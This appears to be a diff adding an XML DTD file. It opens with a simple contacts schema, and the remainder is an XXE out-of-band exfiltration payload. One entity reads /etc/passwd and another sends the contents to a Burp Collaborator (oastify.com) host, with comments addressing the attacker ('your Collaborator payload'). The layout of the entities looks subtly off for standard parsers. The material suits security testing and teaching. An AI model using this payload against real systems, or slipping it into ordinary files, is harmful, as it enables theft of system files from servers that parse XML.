@@ -1,0 +1,10 @@
+<!ELEMENT contacts (contact*)>
+<!ELEMENT contact (name, email)>
+<!ELEMENT name (#PCDATA)>
+<!ELEMENT email (#PCDATA)>
+
+<!-- Read the target file (e.g., /etc/passwd) -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!-- Exfiltrate its contents via your Collaborator payload -->
+<!ENTITY exfil SYSTEM "http://ntkfyghy8xz69r6pxy3bx0fm2d86w2kr.oastify.com/?data=%file;">
+
